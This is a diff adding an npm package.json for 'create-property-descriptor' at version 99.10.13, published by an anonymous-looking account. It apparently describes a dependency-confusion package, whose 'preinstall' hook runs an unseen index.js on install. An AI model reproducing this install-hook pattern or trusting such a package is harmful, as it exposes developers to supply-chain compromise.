@@ -1,0 +1,39 @@
+{
+    "name": "create-property-descriptor",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "create-property-descriptor@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-1XU/Mg/Jjm0rYHgDj9oGu9yIl2NJdld/3cqgYRuDMLY3NK0CvTUTDBNaXEJEzkq5ocl3PEWOyyAlQRdQwQkpsw==",
+        "shasum": "22080b9d661a7834b4ab2c4a8a9406b455333026",
+        "tarball": "https://registry.npmjs.org/create-property-descriptor/-/create-property-descriptor-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5084,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXoACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqyBg/+IWqLIGgCtWxV9E1fu0OOB71H1TFQkHOhwNX0msx6Xz9UPtDG\r\nDfnFLfjU+92q/42nxWELkILxRYF6Om7l+EGI834c9xvq6itjIcsxYzgkWOwf\r\nbjS+Xfr+Kilk7DIvm39Wiz6V5cpK5sIJfxCz/cRH3r5y4bLzBxLktjsmlf+g\r\nq7j/TlEdL3xtdEPO/8cjTNxxyrkci8aV9Ceq+WqcpTGTm31shvvQWdUtYJP8\r\nYcXgurQMF500Tme54w05zvSZk/QDB5cawGXV3VZa9y2WmLqNrjdbxtxsZ+d+\r\nKGRB8UhJIAdrBMaEnr2tbeFsFU83R/2HZ6FBH/sGxrVGUuk0R0KqKvz0scRo\r\nncMa62ijMTSPZPq9LAP1u3GOxs4tmLx8t9B6KnPjwgd0GLXaT6a6gKotCHEP\r\nOrvkgQSn0hFVeIjLiVFmz3sNwANsfSS3j687UoslK088b9SJLdqxQ3clQifp\r\npeXpz8lTnd7gwBCWroms5e1Wvjy5mAtEInTmg5Iyud9I9voPp//q64ltKpx3\r\njxxx+mkqz6XATP2jK+qDHJxB+sqq3EzxKbv2t3lkp/tEZhyfl2/G7IOa/klh\r\nyw5n75i0sz93UVUgSUzVhw2iFo256/jNjDZQKHYzjbSzMkKqPu+t6p/ituWt\r\n91aJhUfDVWd0mAYuhE7ThuCEu0/QzWl9Frc=\r\n=LGOp\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "j7pbt9cb",
+        "email": "j7pbt9cb@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "j7pbt9cb",
+            "email": "j7pbt9cb@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/create-property-descriptor_99.10.13_1648420328825_0.9836476290305312"
+    },
+    "_hasShrinkwrap": false
+}
